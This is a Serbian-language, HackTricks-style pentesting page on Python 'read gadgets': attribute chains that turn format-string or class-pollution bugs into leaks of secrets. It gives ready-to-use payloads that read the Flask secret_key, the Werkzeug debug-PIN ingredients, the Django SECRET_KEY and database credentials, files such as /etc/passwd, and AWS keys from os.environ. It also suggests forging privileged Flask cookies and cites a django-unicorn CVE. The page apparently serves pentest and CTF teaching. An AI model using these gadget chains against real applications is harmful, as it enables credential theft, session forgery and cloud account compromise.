# Python Internal Read Gadgets

{{#include ../../banners/hacktricks-training.md}}

## Osnovne informacije

Različite ranjivosti, kao što su [**Python Format Strings**](bypass-python-sandboxes/index.html#python-format-string) ili [**Class Pollution**](class-pollution-pythons-prototype-pollution.md), mogu vam omogućiti da **čitate interne podatke Pythona, ali vam neće omogućiti izvršavanje koda**. Zbog toga će pentester morati da maksimalno iskoristi ove dozvole za čitanje kako bi **dobio osetljive privilegije i eskalirao ranjivost**.

### Flask - Čitanje tajnog ključa

Glavna stranica Flask aplikacije će verovatno imati globalni objekat **`app`**, u kojem je ovaj **secret konfigurisan**.
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
U ovom slučaju moguće je pristupiti ovom objektu korišćenjem bilo kog gadget-a za **pristup globalnim objektima** sa stranice [**Bypass Python sandboxes**](bypass-python-sandboxes/index.html).

U slučaju kada je **ranjivost u drugom python fajlu**, potreban vam je gadget za prolazak kroz fajlove kako biste došli do glavnog fajla i **pristupili globalnom objektu `app.secret_key`**, a zatim mogli da [**eskalirate privilegije** poznavajući ovaj ključ](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).

Payload poput ovog [iz ovog writeup-a](https://ctftime.org/writeup/36082):
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
Koristite ovaj payload da biste **pročitali `app.secret_key`**. Ako originalni bug takođe omogućava write primitive (na primer, class pollution), isti path može da se koristi za zamenu ove vrednosti i potpisivanje privilegovanijih Flask cookies.

### Werkzeug - machine_id i node uuid

[**Koristeći ove payload-e iz ovog writeup-a**](https://vozec.fr/writeups/tweedle-dum-dee/) moći ćete da pristupite **machine_id** i **uuid** node-u, koji predstavljaju **privatne delove** potrebne za [**generisanje Werkzeug pina**](../../network-services-pentesting/pentesting-web/werkzeug.md) i pristup Python konzoli na `/console` ako je **debug mode omogućen**:
```python
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]._machine_id}
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug].uuid._node}
```
> [!WARNING]
> Imajte na umu da možete dobiti **lokalnu putanju servera do `app.py`** izazivanjem neke **greške** na veb-stranici, koja će vam **prikazati putanju**.

Ako je ranjivost u drugom Python fajlu, pogledajte prethodni Flask trik za pristup objektima iz glavnog Python fajla.

### Django - SECRET_KEY i settings modul

Django settings objekat se kešira u `sys.modules` kada se aplikacija pokrene. Sa samo read primitivima možete izvršiti leak vrednosti **`SECRET_KEY`**, fallback ključeva, akreditiva baze podataka ili salt-ova za potpisivanje:
```python
# When DJANGO_SETTINGS_MODULE is set (usual case)
sys.modules[os.environ['DJANGO_SETTINGS_MODULE']].SECRET_KEY

# Through the global settings proxy
a = sys.modules['django.conf'].settings
(a.SECRET_KEY, a.SECRET_KEY_FALLBACKS, a.DATABASES, a.SIGNING_BACKEND,
a.SESSION_ENGINE, a.SESSION_SERIALIZER)
```
Ako se ranjivi gadget nalazi u drugom modulu, prvo prođite kroz globals:
```python
__init__.__globals__['sys'].modules['django.conf'].settings.SECRET_KEY
```
`SECRET_KEY_FALLBACKS` su podjednako vredni kao i trenutni `SECRET_KEY`: oni i dalje validiraju stare potpisane vrednosti tokom rotacije. Takođe leak-ujte `SESSION_ENGINE` i `SESSION_SERIALIZER` da biste brzo utvrdili da li je uticaj ograničen samo na falsifikovanje cookie-ja ili je nešto ozbiljnije. Za detalje o uticaju na web, pogledajte [**Django pentesting page**](../../network-services-pentesting/pentesting-web/django.md).

### Module loader gadgets - čitanje izvornog koda i datoteka

Učitani Python moduli obično čuvaju `__loader__`. Loader-i zasnovani na datotekama često izlažu `get_source()` i `get_data()`, koji su savršeni **read-only primitives** kada već možete da pristupite objektu modula, ali ne i `open()`:
```python
m = __init__.__globals__['sys'].modules['__main__']
m.__loader__.get_source(m.__name__)   # source of app.py / __main__
m.__loader__.get_data(m.__file__)     # raw bytes of the same file
```
Ovo je veoma korisno za **dump**ovanje **config modules, blueprints, helper files ili hidden routes** i pronalaženje API keys, DSNs, putanja do flagova ili dodatnih gadget entry points.

Ako imate samo subclass enumeration, pretražite loader po imenu umesto hard-coding indeksa:
```python
# unbound call: first argument acts as a dummy self
[c for c in object.__subclasses__() if c.__name__ == 'FileLoader'][0].get_data('.', '/etc/passwd')
```
### Globals okvira generatora / coroutine-a

Ako možete da kreirate ili dođete do generator/coroutine objekta, njegov okvir može da leak-uje globals **bez potrebe za bilo kakvim `__globals__` gadgetom funkcije**. Ovo je korisno protiv filtera koji blokiraju samo dunder nazive i zaboravljaju atribute okvira kao što su `gi_frame`, `ag_frame`, `cr_frame` ili `f_globals`:
```python
(_ for _ in ()).gi_frame.f_globals['__builtins__']
(_ for _ in ()).gi_frame.f_globals['sys'].modules['os'].environ
```
Kada dođete do globals okvira, nastavite potpuno isto kao kod drugih gadgeta (`sys.modules`, objekti settings, `os.environ`, itd.). Nedavni sandbox escapes ponovo otkrivaju ovo zato što `gi_frame` i `f_globals` nisu dunder atributi i često prežive naivne deny-liste.

### Environment variables / cloud creds preko učitanih modula

Mnogi jail-ovi i dalje negde importuju `os` ili `sys`. Možete zloupotrebiti bilo koju dostupnu funkciju `__init__.__globals__` da biste došli do već učitanog `os` modula i izlistali **environment variables** koje sadrže API tokene, cloud ključeve ili flagove:
```python
# Classic os._wrap_close subclass index may change per version
cls = [c for c in object.__subclasses__() if 'os._wrap_close' in str(c)][0]
cls.__init__.__globals__['os'].environ['AWS_SECRET_ACCESS_KEY']
```
Ako je indeks podklase filtriran, koristite loadere:
```python
__loader__.__init__.__globals__['sys'].modules['os'].environ['FLAG']
```
Promenljive okruženja su često jedine tajne potrebne za prelazak sa čitanja na potpunu kompromitaciju (cloud IAM ključevi, URL-ovi baza podataka, ključevi za potpisivanje itd.).

### Django-Unicorn class pollution (CVE-2025-24370)

`django-unicorn` ([**GHSA-g9wf-5777-gq43**](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43), `<0.62.0`) je omogućavao **class pollution** putem posebno izrađenih component zahteva. Postavljanje putanje svojstva kao što je `__init__.__globals__` omogućavalo je napadaču pristup globalnim promenljivama component modula i svim uvezenim modulima (npr. `settings`, `os`, `sys`). Odatle možete da uradite leak vrednosti `SECRET_KEY`, `DATABASES` ili kredencijala servisa bez izvršavanja koda. Lanac eksploatacije zasniva se isključivo na čitanju i koristi iste dunder-gadget obrasce kao iznad.

### Kolekcije gadgeta za chaining

Nedavni CTF-ovi i istraživanja pyjail okruženja pokazuju pouzdane read lance izgrađene samo pomoću pristupa atributima i enumeracije podklasa. Liste koje održava zajednica, kao što je [**pyjailbreaker**](https://github.com/jailctf/pyjailbreaker), katalogizuju stotine minimalnih gadgeta koje možete kombinovati za kretanje od objekata do `__globals__`, `sys.modules` i konačno do osetljivih podataka. Dajte prednost pretragama zasnovanim na atributima/nazivima u odnosu na sirove indekse podklasa, jer se pozicija objekata `os._wrap_close`, `FileLoader`, `warnings.catch_warnings` itd. menja između verzija Python-a i sa dodatnim uvezenim bibliotekama.

## Reference

- [Django dokumentacija o kriptografskom potpisivanju](https://docs.djangoproject.com/en/6.0/topics/signing/)
- [pyjailbreaker – wiki gadgeta za Python sandbox](https://github.com/jailctf/pyjailbreaker)
{{#include ../../banners/hacktricks-training.md}}
